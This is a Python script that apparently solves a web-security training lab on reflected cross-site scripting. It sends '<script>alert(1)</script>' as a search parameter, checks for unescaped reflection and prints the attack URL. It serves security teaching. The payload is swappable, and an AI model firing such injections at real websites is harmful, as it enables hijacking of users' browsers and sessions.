import argparse
import requests

# Reflected XSS into HTML context with nothing encoded. The search parameter is
# echoed straight back into the response HTML with no output encoding, so an
# injected <script> tag is parsed and executed by the browser. This script sends
# the payload and confirms the unescaped reflection (the condition that makes the
# alert fire); the alert itself executes in a real browser.

parser = argparse.ArgumentParser(description="Solve XSS lab 1 (reflected into HTML context, nothing encoded)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default="<script>alert(1)</script>", help="XSS payload for the search field")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# requests URL-encodes the payload in the query string; the server decodes it and
# reflects it raw into the HTML response.
resp = requests.get(lab_url + "/", params={"search": args.payload})

if args.payload in resp.text:
    print(f"[+] Payload reflected unescaped: {args.payload}")
    print("[+] This executes in a browser -> alert() fires.")
else:
    print("[!] Payload not found verbatim in the response; it may be encoded/filtered.")

# the lab backend marks it solved once the XSS is triggered
if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - open the URL below in a browser to trigger the alert:")
    print(f"    {lab_url}/?search={args.payload}")
